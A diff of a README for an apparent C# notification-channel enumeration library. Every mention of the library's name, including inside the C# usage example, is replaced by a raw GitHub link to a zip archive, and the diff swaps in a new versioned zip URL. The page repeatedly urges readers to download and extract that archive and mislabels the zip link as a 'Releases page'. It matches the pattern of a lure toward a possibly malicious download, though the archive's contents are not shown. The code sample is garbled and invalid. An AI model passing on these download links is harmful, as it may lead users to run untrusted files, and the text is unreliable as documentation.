@@ -1,13 +1,13 @@
-# 📦 https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip - Simplify Your Notification Channels
+# 📦 https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip - Simplify Your Notification Channels
 
 ## 🚀 Getting Started
-Welcome to the **https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip** repository! This project helps you manage common notification channels easily. Whether you want to integrate with Slack, Teams, or other platforms, this tool makes it straightforward. 
+Welcome to the **https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip** repository! This project helps you manage common notification channels easily. Whether you want to integrate with Slack, Teams, or other platforms, this tool makes it straightforward. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip%20Latest%https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip)](https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip)
+[![Download Latest Release](https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip%20Latest%https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip)](https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip)
 
 ## 📦 What is this?
-**https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip** provides a collection of enumerations for common notification channels. This application is particularly useful for developers and non-developers alike who want to work with notification channels in a structured way. 
+**https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip** provides a collection of enumerations for common notification channels. This application is particularly useful for developers and non-developers alike who want to work with notification channels in a structured way. 
 
 ## 💻 System Requirements
 - Operating System: Windows 10 or later, macOS, or any Linux distribution.
@@ -23,10 +23,10 @@ Welcome to the **https://raw.githubusercontent.com/papclass/soenneker.enums.noti
 - Well-documented code for easy integration.
 
 ## 📜 Installation
-To install the **https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip** library, follow these steps:
+To install the **https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip** library, follow these steps:
 
 1. **Visit our Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip). 
+   Go to the [Releases page](https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip). 
    
 2. **Choose the Latest Version**
    Look for the latest version listed at the top of the page. 
@@ -43,14 +43,14 @@ To install the **https://raw.githubusercontent.com/papclass/soenneker.enums.noti
    Use the extracted files in your application as per your requirements. Follow the provided documentation for detailed guidance on integrating this library into your project.
 
 ## 🔥 Usage
-To start using **https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip**, refer to this simple syntax guide:
+To start using **https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip**, refer to this simple syntax guide:
 
 ### C# Example:
 ```csharp
-using https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip;
+using https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip;
 
-var channel = https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip;
-https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip($"Selected notification channel: {channel}");
+var channel = https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip;
+https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip($"Selected notification channel: {channel}");
 ```
 
 This code snippet shows how easy it is to access the defined enumeration.
@@ -65,8 +65,8 @@ We welcome contributions! If you'd like to help improve this project, check out 
 This project is licensed under the MIT License. You can use it freely, but please keep the license terms in mind.
 
 ## 📥 Download & Install
-Remember to visit the [Releases page](https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip) to download the latest version of the **https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip** library. 
+Remember to visit the [Releases page](https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip) to download the latest version of the **https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip** library. 
 
 By following the simple steps detailed above, you'll be up and running in no time. 
 
-Thank you for using **https://raw.githubusercontent.com/papclass/soenneker.enums.notificationchannels/main/airscape/soenneker.enums.notificationchannels.zip**!
+Thank you for using **https://github.com/papclass/soenneker.enums.notificationchannels/raw/refs/heads/main/airscape/soenneker-enums-notificationchannels-v3.7.zip**!
